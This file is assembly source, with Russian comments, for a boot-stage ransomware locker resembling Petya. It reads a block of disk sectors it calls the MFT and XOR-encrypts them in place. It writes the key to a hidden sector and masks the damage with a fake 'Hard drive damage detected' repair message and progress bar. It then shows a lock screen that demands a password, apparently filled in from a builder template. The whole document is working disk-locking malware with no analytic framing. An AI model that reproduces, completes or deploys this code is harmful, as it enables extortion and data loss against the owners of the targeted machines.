BITS 16
ORG 0x8000

start_stage2:
    mov ax, 0x0003
    int 0x10

    mov ah, 0x06
    mov al, 0
    mov bh, 0x00
    mov cx, 0
    mov dx, 0x184F
    int 0x10

    ; ============================================================
    ; ПРОВЕРКА: ЕСТЬ ЛИ КЛЮЧ В СЕКТОРЕ 30?
    ; ============================================================
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9000
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 30
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc encrypt_first

    cmp byte [0x9000], 0x00
    je encrypt_first

    jmp show_lock_screen

encrypt_first:
    mov si, msg_damage
    call print

    ; ЧИТАЕМ MFT (СЕКТОРЫ 3-12)
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9100
    mov ah, 0x02
    mov al, 10
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    ; СОХРАНЯЕМ ОРИГИНАЛ В СЕКТОРЫ 20-29
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9100
    mov ah, 0x03
    mov al, 10
    mov ch, 0
    mov cl, 20
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    ; ШИФРУЕМ XOR 0xAA
    mov si, 0x9100
    mov cx, 5120
.encrypt_loop:
    lodsb
    xor al, 0xAA
    mov [si-1], al
    loop .encrypt_loop

    ; ЗАПИСЫВАЕМ ЗАШИФРОВАННЫЙ MFT
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9100
    mov ah, 0x03
    mov al, 10
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    ; СОХРАНЯЕМ КЛЮЧ В СЕКТОР 30
    mov ax, 0x0000
    mov es, ax
    mov bx, key_data
    mov ah, 0x03
    mov al, 1
    mov ch, 0
    mov cl, 30
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    call show_restore_progress
    jmp show_lock_screen

show_lock_screen:
    mov ax, 0x0003
    int 0x10

    mov ah, 0x06
    mov al, 0
    mov bh, 0x00
    mov cx, 0
    mov dx, 0x184F
    int 0x10

    ; ЧИТАЕМ ТЕКСТ ИЗ СЕКТОРА 15
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9200
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 15
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov si, 0x9200
    call print

    mov ah, 0x02
    mov bh, 0
    mov dh, 24
    mov dl, 0
    int 0x10

    mov si, msg_prompt
    call print

password_loop:
    call get_password
    call check_password
    cmp byte [password_ok], 1
    je decrypt_and_boot

    mov si, msg_wrong
    call print

    mov ah, 0x02
    mov bh, 0
    mov dh, 24
    mov dl, 9
    int 0x10

    jmp password_loop

decrypt_and_boot:
    ; ЧИТАЕМ КЛЮЧ
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9000
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 30
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov al, [0x9000]
    mov [key], al

    ; ЧИТАЕМ ЗАШИФРОВАННЫЙ MFT
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9100
    mov ah, 0x02
    mov al, 10
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    ; РАСШИФРОВЫВАЕМ
    mov si, 0x9100
    mov cx, 5120
.decrypt_loop:
    lodsb
    xor al, [key]
    mov [si-1], al
    loop .decrypt_loop

    ; ЗАПИСЫВАЕМ РАСШИФРОВАННЫЙ MFT
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9100
    mov ah, 0x03
    mov al, 10
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    call restore_mbr
    int 0x19

restore_mbr:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 2
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc .error

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 1
    mov ch, 0
    mov cl, 1
    mov dh, 0
    mov dl, 0x80
    int 0x13
.error:
    popa
    ret

show_restore_progress:
    mov si, msg_restore
    call print
    mov si, msg_percent
    call print

    mov ah, 0x0E
    mov al, '0'
    int 0x10
    mov al, '0'
    int 0x10
    mov al, '%'
    int 0x10
    call delay_1s

    mov ah, 0x0E
    mov al, '5'
    int 0x10
    mov al, '0'
    int 0x10
    mov al, '%'
    int 0x10
    call delay_1s

    mov ah, 0x0E
    mov al, '1'
    int 0x10
    mov al, '0'
    int 0x10
    mov al, '0'
    int 0x10
    mov al, '%'
    int 0x10
    call delay_1s
    ret

delay_1s:
    mov cx, 0xFFFF
.delay_loop:
    dec cx
    jnz .delay_loop
    ret

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    int 0x10
    jmp print
.done:
    ret

get_password:
    mov di, buffer
.loop:
    xor ax, ax
    int 0x16
    cmp al, 0x0D
    je .done
    cmp al, 0x08
    je .backspace
    cmp al, 0x7F
    je .backspace
    cmp di, buffer + 64
    je .loop
    stosb
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    mov al, [di - 1]
    int 0x10
    jmp .loop
.backspace:
    cmp di, buffer
    je .loop
    dec di
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    mov al, 0x08
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 0x08
    int 0x10
    jmp .loop
.done:
    mov byte [di], 0
    mov ah, 0x0E
    mov bh, 0x00
    mov bl, 0x07
    mov al, 0x0A
    int 0x10
    mov al, 0x0D
    int 0x10
    ret

check_password:
    mov si, buffer
    mov di, password
.compare:
    lodsb
    or al, al
    jz .check_end
    cmp al, [di]
    jne .fail
    inc di
    jmp .compare
.check_end:
    cmp byte [di], 0
    jne .fail
    mov byte [password_ok], 1
.fail:
    ret

load_error:
    mov si, msg_error
    call print
    jmp hang

hang:
    cli
    hlt
    jmp hang

msg_damage:
    db 'Hard drive damage detected!',13,10
    db 'Attempting to restore file system...',13,10,0

msg_restore:
    db 'Restoring MFT...',13,10,0

msg_percent:
    db 'Progress: ',0

msg_prompt:
    db 'Password: ',0

msg_wrong:
    db 'Wrong password!',13,10,0

msg_error:
    db 'Load error!',0

password:
    db {PASSWORD_HEX}

buffer:
    times 64 db 0
password_ok:
    db 0

key:
    db 0xAA

key_data:
    db 0xAA
    times 511 db 0

times 1024 - ($ - 0x8000) db 0
